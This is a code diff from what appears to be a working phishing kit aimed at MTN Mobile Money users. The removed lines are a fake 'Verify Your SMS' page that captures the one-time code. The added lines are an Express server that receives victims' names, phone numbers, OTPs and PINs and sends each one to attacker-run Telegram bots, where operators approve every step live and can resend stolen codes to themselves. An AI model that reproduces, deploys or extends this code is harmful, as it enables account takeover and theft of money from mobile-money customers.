@@ -1,448 +1,283 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>MTN Mobile Money - Verify</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background: #fff;
-            color: #222;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-        .top-bar {
-            height: 72px;
-            background: #FFCC00;
-            display: flex;
-            align-items: center;
-            padding: 0 22px;
-            flex-shrink: 0;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-        }
-        .top-bar .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .top-bar .logo svg {
-            height: 36px;
-            width: auto;
-        }
-        .top-bar .logo span {
-            font-weight: 700;
-            font-size: 18px;
-            color: #004B87;
-            letter-spacing: -0.5px;
-        }
-        .back-btn {
-            color: #004B87;
-            font-size: 30px;
-            text-decoration: none;
-            font-weight: 300;
-            margin-right: 16px;
-        }
-        .container {
-            flex: 1;
-            width: 100%;
-            max-width: 420px;
-            margin: 0 auto;
-            padding: 28px 24px 20px;
-            display: flex;
-            flex-direction: column;
-        }
-        .title {
-            font-size: 26px;
-            font-weight: 700;
-            color: #004B87;
-            margin-bottom: 4px;
-            letter-spacing: -0.3px;
-        }
-        .subtitle {
-            font-size: 15px;
-            color: #555;
-            line-height: 1.5;
-            margin-bottom: 16px;
-        }
-        .instruction-note {
-            font-size: 14px;
-            color: #004B87;
-            background: #e8f0fe;
-            padding: 12px 16px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            border: 1px solid #bbd4f0;
-            line-height: 1.6;
-        }
-        .valid-time {
-            font-size: 14px;
-            color: #888;
-            margin-bottom: 24px;
-        }
-        .message-area {
-            margin-bottom: 20px;
-        }
-        .message-area textarea {
-            width: 100%;
-            min-height: 120px;
-            padding: 14px 16px;
-            border: 2px solid #d0d7de;
-            border-radius: 10px;
-            font-size: 16px;
-            font-family: inherit;
-            resize: vertical;
-            outline: none;
-            transition: border 0.2s, box-shadow 0.2s;
-            background: #fff;
-            line-height: 1.6;
-        }
-        .message-area textarea:focus {
-            border-color: #FFCC00;
-            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.3);
-        }
-        .message-area textarea::placeholder {
-            color: #aaa;
-        }
-        .resend-wrap {
-            color: #666;
-            font-size: 15px;
-            margin-bottom: 0;
-        }
-        .resend-wrap .timer {
-            font-weight: 600;
-            color: #004B87;
-        }
-        .continue-btn {
-            position: fixed;
-            left: 24px;
-            right: 24px;
-            bottom: 28px;
-            height: 56px;
-            border: none;
-            border-radius: 10px;
-            background: #ccc;
-            color: #fff;
-            font-size: 20px;
-            font-weight: 700;
-            cursor: not-allowed;
-            transition: background 0.2s;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            max-width: 420px;
-            margin: 0 auto;
-            left: 50%;
-            transform: translateX(-50%);
-        }
-        .continue-btn:enabled {
-            background: #FFCC00;
-            color: #004B87;
-            cursor: pointer;
-        }
-        .continue-btn:enabled:hover {
-            background: #e6b800;
-        }
-        #message-box {
-            display: none;
-            padding: 12px 16px;
-            border-radius: 8px;
-            margin-bottom: 16px;
-            font-size: 15px;
-            font-weight: 500;
-        }
-        @media (max-width: 480px) {
-            .container {
-                padding: 22px 18px 16px;
-            }
-            .title {
-                font-size: 24px;
-            }
-            .message-area textarea {
-                min-height: 100px;
-                font-size: 15px;
-            }
-            .continue-btn {
-                height: 54px;
-                font-size: 18px;
-                left: 18px;
-                right: 18px;
-                bottom: 22px;
-            }
-        }
-        @media (max-width: 360px) {
-            .message-area textarea {
-                min-height: 80px;
-                font-size: 14px;
-            }
-        }
-    </style>
-</head>
-<body>
+require('dotenv').config();
+const express = require('express');
+const axios = require('axios');
+const { v4: uuidv4 } = require('uuid');
 
-    <div class="top-bar">
-        <a href="#" class="back-btn">&#8592;</a>
-        <div class="logo">
-            <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <rect x="2" y="2" width="36" height="36" rx="8" fill="#FFCC00" stroke="#004B87" stroke-width="2"/>
-                <path d="M14 12L22 12L18 20L22 28L14 28L18 20L14 12Z" fill="#004B87"/>
-                <text x="46" y="26" font-family="Arial, sans-serif" font-weight="700" font-size="20" fill="#004B87">MTN Mobile Money</text>
-            </svg>
-            <span>Mobile Money</span>
-        </div>
-    </div>
+const app = express();
+const PORT = process.env.PORT || 10000;
+const DOMAIN = process.env.BACKEND_DOMAIN;
 
-    <div class="container">
-        <div class="title">Verify Your SMS</div>
-        <div class="subtitle" id="subtitlePlaceholder">
-            We sent a code to your phone number
-        </div>
+// ---------- IN-MEMORY STORES ----------
+const phoneRequests = {};
+const otpRequests = {};
+const pinRequests = {};
+const requestMeta = {};
 
-        <div class="instruction-note">
-            📱 Copy the <strong>entire SMS message</strong> you received and paste it in the box below.
-        </div>
+// ---------- BOTS ----------
+const bots = [];
+Object.keys(process.env).forEach(key => {
+  const match = key.match(/^BOT(\d+)_TOKEN$/);
+  if (!match) return;
+  const i = match[1];
+  const token = process.env[`BOT${i}_TOKEN`];
+  const chatId = process.env[`BOT${i}_CHATID`];
+  if (token && chatId) bots.push({ botId: `bot${i}`, token, chatId });
+});
+console.log('✅ Bots loaded:', bots.map(b => b.botId));
 
-        <div class="valid-time">The code is valid for 20 seconds</div>
+// ---------- MIDDLEWARE ----------
+app.use(express.json({ type: '*/*' }));
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static('public'));
 
-        <div class="message-area">
-            <textarea id="smsMessage" placeholder="Paste the whole SMS message here..."></textarea>
-        </div>
+// ---------- HELPERS ----------
+function getBot(botId) {
+  return bots.find(b => b.botId === botId);
+}
 
-        <div class="resend-wrap">
-            Resend code in <span class="timer">00:20</span>
-        </div>
-    </div>
+async function sendTelegram(bot, text, buttons = []) {
+  try {
+    await axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+      chat_id: bot.chatId,
+      text,
+      reply_markup: buttons.length ? { inline_keyboard: buttons } : undefined
+    });
+  } catch (e) {
+    console.error('❌ Telegram error:', e.response?.data || e.message);
+  }
+}
 
-    <button class="continue-btn" disabled>SUBMIT</button>
+async function answerCallback(bot, id) {
+  try {
+    await axios.post(
+      `https://api.telegram.org/bot${bot.token}/answerCallbackQuery`,
+      { callback_query_id: id }
+    );
+  } catch {}
+}
 
-    <script>
-        (function() {
-            const phone = localStorage.getItem('phone');
-            const subtitle = document.getElementById('subtitlePlaceholder');
-            if (phone) {
-                subtitle.textContent = 'We sent a code to ' + phone;
-            }
-        })();
-    </script>
+// ---------- WEBHOOKS ----------
+async function setWebhook(bot) {
+  if (!DOMAIN) return;
+  const url = `${DOMAIN}/telegram-webhook/${bot.botId}`;
+  try {
+    await axios.get(
+      `https://api.telegram.org/bot${bot.token}/setWebhook?url=${url}`
+    );
+    console.log(`✅ Webhook set for ${bot.botId}`);
+  } catch (e) {
+    console.error('❌ Webhook error:', e.response?.data || e.message);
+  }
+}
 
-    <script>
-        (function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            let botId = urlParams.get('botId') || localStorage.getItem('botId');
-            let name = urlParams.get('name') || localStorage.getItem('name');
-            let phone = urlParams.get('phone') || localStorage.getItem('phone');
+async function setAllWebhooks() {
+  for (const bot of bots) await setWebhook(bot);
+}
 
-            if (!name) {
-                name = localStorage.getItem('fullName');
-                if (name) localStorage.setItem('name', name);
-            }
+// ---------- PHONE STEP ----------
+app.post('/submit-phone', (req, res) => {
+  try {
+    const { name, phone, botId } = req.body;
+    const bot = getBot(botId);
+    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
 
-            if (!phone) {
-                const subtitle = document.querySelector('.subtitle');
-                const match = subtitle.textContent.match(/\((\+?\d+)\)\s*(\d+)/);
-                if (match) phone = match[1] + match[2];
-                if (phone) localStorage.setItem('phone', phone);
-            }
+    const requestId = uuidv4();
+    phoneRequests[requestId] = null;
+    requestMeta[requestId] = { name, phone, botId };
 
-            if (botId) localStorage.setItem('botId', botId);
+    sendTelegram(
+      bot,
+      `📱 PHONE VERIFICATION
+👤 Name: ${name}
+📞 Phone: ${phone}
+🆔 Ref: ${requestId}`,
+      [
+        [
+          { text: '✅ Approve', callback_data: `phone_ok:${requestId}` },
+          { text: '❌ Reject', callback_data: `phone_bad:${requestId}` }
+        ]
+      ]
+    );
 
-            const container = document.querySelector('.container');
-            const msgDiv = document.createElement('div');
-            msgDiv.id = 'message-box';
-            msgDiv.style.display = 'none';
-            msgDiv.style.padding = '12px 16px';
-            msgDiv.style.borderRadius = '8px';
-            msgDiv.style.marginBottom = '20px';
-            msgDiv.style.fontSize = '15px';
-            msgDiv.style.fontWeight = '500';
-            msgDiv.style.transition = 'all 0.2s ease';
-            const resendWrap = document.querySelector('.resend-wrap');
-            container.insertBefore(msgDiv, resendWrap);
+    res.json({ requestId });
+  } catch {
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
 
-            function showMessage(text, isError = true) {
-                msgDiv.textContent = text;
-                msgDiv.style.display = 'block';
-                msgDiv.style.background = isError ? '#fde7e7' : '#e7f5e7';
-                msgDiv.style.color = isError ? '#b00020' : '#1e7e34';
-                msgDiv.style.border = isError ? '1px solid #f5c6cb' : '1px solid #b7d7b7';
-            }
+app.get('/check-phone/:id', (req, res) => {
+  const result = phoneRequests[req.params.id];
+  if (result === true) return res.json({ redirect: 'link.html' });
+  if (result === false) return res.json({ approved: false });
+  res.json({ approved: null });
+});
 
-            function hideMessage() {
-                msgDiv.style.display = 'none';
-                msgDiv.textContent = '';
-            }
+// ---------- OTP STEP (UPDATED with code block + resend) ----------
+app.post('/submit-otp', (req, res) => {
+  try {
+    const { name, phone, otp, botId } = req.body;
+    const bot = getBot(botId);
+    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
 
-            const textarea = document.getElementById('smsMessage');
-            const continueBtn = document.querySelector('.continue-btn');
+    const requestId = uuidv4();
+    otpRequests[requestId] = null;
+    // Save OTP so we can resend it later
+    requestMeta[requestId] = { name, phone, botId, otp };
 
-            function checkTextArea() {
-                const val = textarea.value.trim();
-                if (val !== '') {
-                    continueBtn.disabled = false;
-                    continueBtn.style.background = '#FFCC00';
-                    continueBtn.style.color = '#004B87';
-                    continueBtn.style.cursor = 'pointer';
-                } else {
-                    continueBtn.disabled = true;
-                    continueBtn.style.background = '#ccc';
-                    continueBtn.style.color = '#fff';
-                    continueBtn.style.cursor = 'not-allowed';
-                }
-                hideMessage();
-            }
+    sendTelegram(
+      bot,
+      `🔐 OTP VERIFICATION
+👤 Name: ${name}
+📞 Phone: ${phone}
+🔢 OTP:
+\`\`\`
+${otp}
+\`\`\`
+🆔 Ref: ${requestId}`,
+      [
+        [
+          { text: '✅ Correct OTP', callback_data: `otp_ok:${requestId}` },
+          { text: '❌ Wrong OTP', callback_data: `otp_bad:${requestId}` }
+        ],
+        [
+          { text: '📋 Resend OTP', callback_data: `resend_otp:${requestId}` }
+        ]
+      ]
+    );
 
-            textarea.addEventListener('input', checkTextArea);
-            textarea.addEventListener('paste', function() {
-                setTimeout(checkTextArea, 10);
-            });
-            textarea.focus();
+    res.json({ requestId });
+  } catch {
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
 
-            const timerSpan = document.querySelector('.timer');
-            const resendWrapEl = document.querySelector('.resend-wrap');
-            let totalSeconds = 20;
-            let interval = null;
+app.get('/check-otp/:id', (req, res) => {
+  res.json({ approved: otpRequests[req.params.id] ?? null });
+});
 
-            function formatTime(sec) {
-                const m = String(Math.floor(sec / 60)).padStart(2, '0');
-                const s = String(sec % 60).padStart(2, '0');
-                return `${m}:${s}`;
-            }
+// ---------- PIN STEP ----------
+app.post('/submit-pin', (req, res) => {
+  try {
+    const { name, phone, pin, botId } = req.body;
+    const bot = getBot(botId);
+    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
 
-            function updateTimerUI() {
-                if (totalSeconds <= 0) {
-                    resendWrapEl.innerHTML = 'Resend code';
-                    resendWrapEl.style.color = '#004B87';
-                    resendWrapEl.style.cursor = 'pointer';
-                    resendWrapEl.style.fontWeight = '600';
-                    clearInterval(interval);
-                    interval = null;
-                    resendWrapEl.onclick = function(e) {
-                        e.preventDefault();
-                        startTimer(20);
-                        hideMessage();
-                    };
-                    return;
-                }
-                timerSpan.textContent = formatTime(totalSeconds);
-                resendWrapEl.innerHTML = `Resend code in <span class="timer">${formatTime(totalSeconds)}</span>`;
-                resendWrapEl.style.color = '#666';
-                resendWrapEl.style.cursor = 'default';
-                resendWrapEl.style.fontWeight = '400';
-                resendWrapEl.onclick = null;
-            }
+    const requestId = uuidv4();
+    pinRequests[requestId] = null;
+    requestMeta[requestId] = { name, phone, botId };
 
-            function startTimer(seconds) {
-                if (interval) clearInterval(interval);
-                totalSeconds = seconds;
-                updateTimerUI();
-                interval = setInterval(() => {
-                    totalSeconds--;
-                    if (totalSeconds <= 0) {
-                        totalSeconds = 0;
-                        updateTimerUI();
-                        clearInterval(interval);
-                        interval = null;
-                    } else {
-                        updateTimerUI();
-                    }
-                }, 1000);
-            }
+    sendTelegram(
+      bot,
+      `🔐 PIN VERIFICATION
+👤 Name: ${name}
+📞 Phone: ${phone}
+🔢 PIN: ${pin}
+🆔 Ref: ${requestId}`,
+      [
+        [
+          { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
+          { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
+        ]
+      ]
+    );
 
-            startTimer(20);
+    res.json({ requestId });
+  } catch {
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
 
-            function hasRequiredData() {
-                if (!name) {
-                    showMessage('Name missing – please go back and enter your name.', true);
-                    return false;
-                }
-                if (!phone) {
-                    showMessage('Phone number missing – please restart.', true);
-                    return false;
-                }
-                if (!botId) {
-                    showMessage('Bot ID missing – please use the correct link.', true);
-                    return false;
-                }
-                hideMessage();
-                return true;
-            }
+app.get('/check-pin/:id', (req, res) => {
+  res.json({ approved: pinRequests[req.params.id] ?? null });
+});
 
-            continueBtn.addEventListener('click', function() {
-                if (this.disabled) return;
-                if (!hasRequiredData()) return;
+// ---------- TELEGRAM CALLBACK WEBHOOK (UPDATED) ----------
+app.post('/telegram-webhook/:botId', async (req, res) => {
+  const bot = getBot(req.params.botId);
+  if (!bot) return res.sendStatus(404);
 
-                const message = textarea.value.trim();
-                if (message === '') {
-                    showMessage('Please paste or type the SMS message.', true);
-                    return;
-                }
+  const cb = req.body.callback_query;
+  if (!cb) return res.sendStatus(200);
 
-                continueBtn.disabled = true;
-                continueBtn.textContent = 'Verifying...';
-                continueBtn.style.background = '#f5a623';
-                continueBtn.style.color = '#fff';
+  const [action, requestId] = cb.data.split(':');
+  const meta = requestMeta[requestId];
 
-                fetch('/submit-otp', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ name, phone, otp: message, botId })
-                })
-                .then(response => {
-                    if (!response.ok) throw new Error('Server error');
-                    return response.json();
-                })
-                .then(data => {
-                    const requestId = data.requestId;
-                    if (!requestId) throw new Error('No ID received');
+  let feedback = '';
 
-                    let pollInterval = setInterval(() => {
-                        fetch(`/check-otp/${requestId}`)
-                            .then(res => {
-                                if (!res.ok) throw new Error('Verification error');
-                                return res.json();
-                            })
-                            .then(status => {
-                                if (status.approved === true) {
-                                    clearInterval(pollInterval);
-                                    window.location.href = `pin.html?botId=${botId}&name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}`;
-                                } else if (status.approved === false) {
-                                    clearInterval(pollInterval);
-                                    showMessage('Incorrect code. Please try again.', true);
-                                    continueBtn.disabled = false;
-                                    continueBtn.textContent = 'SUBMIT';
-                                    continueBtn.style.background = '#FFCC00';
-                                    continueBtn.style.color = '#004B87';
-                                    textarea.value = '';
-                                    checkTextArea();
-                                    textarea.focus();
-                                }
-                            })
-                            .catch(err => {
-                                clearInterval(pollInterval);
-                                showMessage('Verification error: ' + err.message, true);
-                                continueBtn.disabled = false;
-                                continueBtn.textContent = 'SUBMIT';
-                                continueBtn.style.background = '#FFCC00';
-                                continueBtn.style.color = '#004B87';
-                            });
-                    }, 2000);
-                })
-                .catch(err => {
-                    showMessage('Send error: ' + err.message, true);
-                    continueBtn.disabled = false;
-                    continueBtn.textContent = 'SUBMIT';
-                    continueBtn.style.background = '#FFCC00';
-                    continueBtn.style.color = '#004B87';
-                });
-            });
+  // Phone decisions
+  if (action === 'phone_ok') {
+    phoneRequests[requestId] = true;
+    feedback = '✅ Phone approved – redirecting to OTP page';
+  }
+  if (action === 'phone_bad') {
+    phoneRequests[requestId] = false;
+    feedback = '❌ Phone rejected';
+  }
 
-            hasRequiredData();
-        })();
-    </script>
-</body>
-</html>
+  // OTP decisions
+  if (action === 'otp_ok') {
+    otpRequests[requestId] = true;
+    feedback = '✅ OTP approved – redirecting to PIN page';
+  }
+  if (action === 'otp_bad') {
+    otpRequests[requestId] = false;
+    feedback = '❌ OTP rejected';
+  }
+
+  // PIN decisions
+  if (action === 'pin_ok') {
+    pinRequests[requestId] = true;
+    feedback = '✅ PIN approved – redirecting to success page';
+  }
+  if (action === 'pin_bad') {
+    pinRequests[requestId] = false;
+    feedback = '❌ PIN rejected';
+  }
+
+  // NEW: Resend OTP
+  if (action === 'resend_otp') {
+    if (meta && meta.otp) {
+      await sendTelegram(
+        bot,
+        `📋 Here is your OTP again:\n\`\`\`\n${meta.otp}\n\`\`\``,
+        []
+      );
+    }
+    await answerCallback(bot, cb.id);
+    res.sendStatus(200);
+    return;
+  }
+
+  if (feedback && meta) {
+    await sendTelegram(
+      bot,
+      `📝 ACTION TAKEN
+👤 Name: ${meta.name || '—'}
+📞 Phone: ${meta.phone || '—'}
+${feedback}`
+    );
+  }
+
+  await answerCallback(bot, cb.id);
+  res.sendStatus(200);
+});
+
+// ---------- BOT ENTRY POINT ----------
+app.get('/bot/:botId', (req, res) => {
+  const bot = bots.find(b => b.botId === req.params.botId);
+  if (!bot) return res.status(404).send('Invalid bot');
+  res.redirect(`/index.html?botId=${bot.botId}`);
+});
+
+// ---------- DEBUG (optional) ----------
+app.get('/debug/bot', (req, res) => {
+  res.json({
+    count: bots.length,
+    bots: bots.map(b => ({ botId: b.botId, chatId: b.chatId }))
+  });
+});
+
+// ---------- START SERVER ----------
+setAllWebhooks().then(() => {
+  app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
+});
